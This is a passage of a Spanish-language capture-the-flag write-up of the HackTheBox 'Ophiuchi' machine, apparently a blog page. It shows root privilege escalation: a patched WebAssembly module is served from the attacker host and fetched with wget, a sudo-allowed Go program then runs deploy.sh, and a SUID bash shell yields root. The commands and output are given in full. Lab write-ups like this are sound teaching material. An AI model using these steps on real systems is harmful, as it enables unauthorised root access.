+Conectando con 10.10.10.227:8000... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 1479371 (1,4M) [application/wasm]
+Grabando a: «main.wasm»
+
+main.wasm              100%[=========================&gt;]   1,41M   276KB/s    en 7,4s    
+
+2023-03-25 01:21:51 (195 KB/s) - «main.wasm» guardado [1479371/1479371]
+
+❯ ls
+ yaml-payload   2021-07-03-ophiuchi.md   main.wasm
+</code></pre>
+
+<p>Ahora usando la herramienta previamente instalada haremos uso de <code>wasm2wat</code> sobre el archivo <code>main.wasm</code> y lo exportaremos como <code>main.wat</code></p>
+
+<pre><code class="language-bash">❯ ls
+ yaml-payload   2021-07-03-ophiuchi.md   main.wasm
+❯ cat main.wat
+(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 0)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export "memory" (memory 0))
+  (export "info" (func $info))
+  (export "__data_end" (global 1))
+  (export "__heap_base" (global 2)))
+</code></pre>
+
+<p>Al leer el archivo vemos que hay una constante declarada con el valor de 0 <code>i32.const 0)</code> la cual genera el problema por el cual el <code>index.go</code> no nos puede ejecutar el <code>deploy.sh</code>, asi que la modificaremos esa variable y le pondremos el valor de <code>1</code>.</p>
+
+<pre><code class="language-bash">(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 1)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export "memory" (memory 0))
+  (export "info" (func $info))
+  (export "__data_end" (global 1))
+  (export "__heap_base" (global 2)))
+
+</code></pre>
+
+<p>Una vez modificada debemos volver a generar un archivo <code>main.wasm</code>, el cual lo haremos con <code>wat2wasm</code> y lo subimos a la maquina victima compartiendonos un servicio con <code>python</code>no sin antes borrar el <code>main.wasm</code> de antes.</p>
+
+<pre><code class="language-bash">❯ /opt/wabt/build/wat2wasm main.wat &gt; main.wasm
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+
+<pre><code class="language-bash">admin@ophiuchi:/tmp$ rm main.wasm 
+admin@ophiuchi:/tmp$ wget http://10.10.16.4/main.wasm
+--2023-03-25 01:34:51--  http://10.10.16.4/main.wasm
+Connecting to 10.10.16.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 112 [application/wasm]
+Saving to: ‘main.wasm’
+
+main.wasm             100%[=========================&gt;]     112  --.-KB/s    in 0s
+
+2023-03-25 01:34:52 (23.2 MB/s) - ‘main.wasm’ saved [112/112]
+
+admin@ophiuchi:/tmp$ ls
+deploy.sh
+hsperfdata_tomcat
+main.wasm
+</code></pre>
+
+<p>Teniendo los archivos volvemos a ejecutar el <code>index.go</code> con el privilegio asignado y</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/tmp$ sudo -l
+Matching Defaults entries for admin on ophiuchi:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on ophiuchi:
+    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+</code></pre>
+<p>Nos lo ejecuta correctamente, entonces nos ejecuto el <code>deploy.sh</code> veamos si es cierto:</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/tmp$ ls -ls /bin/bash
+1156 -rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
+</code></pre>
+
+<p>y poom! ahora la bash es <code>suid</code> solo debemos ejecutar ahora el comando <code>bash -p</code> y visualizar la segunda flag <code>root.txt</code> y habriamos comprometido completamente el sistema :).</p>
+
+<pre><code class="language-bash">admin@ophiuchi:/tmp$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cd /root
+bash-5.0# cat root.txt 
+0a7279e90650d908863ec8e8155efb52
+bash-5.0#
+</code></pre>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        ⚉
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=Maquina - Ophiuchu&url=http://localhost:4000/hackthebox/htb-writeup-Ophiuchi" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/1014319" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/Firtsmiracle" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+
+    </div>
+
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Jekyll Theme by</a> WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
